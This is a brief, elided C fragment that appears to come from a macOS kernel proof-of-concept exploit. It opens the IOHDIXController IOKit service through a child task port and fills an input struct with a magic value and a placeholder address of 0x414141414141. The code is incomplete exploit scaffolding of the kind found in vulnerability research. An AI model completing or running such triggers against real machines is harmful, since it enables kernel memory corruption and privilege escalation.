...
io_connect_t get_connection(mach_port_t task_port) {
  kern_return_t err;
  mach_port_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOHDIXController"));
...
void trigger(int child_pid, mach_port_t child_task_port) {
  ...
  memset(inputStruct, 0, 0x100);
  *(uint32_t*)(&inputStruct[0]) = 0xbeeffeed;

  *(uint64_t*)(&inputStruct[0x8]) = 0x414141414141; // addr
  *(uint64_t*)(&inputStruct[0x10]) = 0x1000; // length
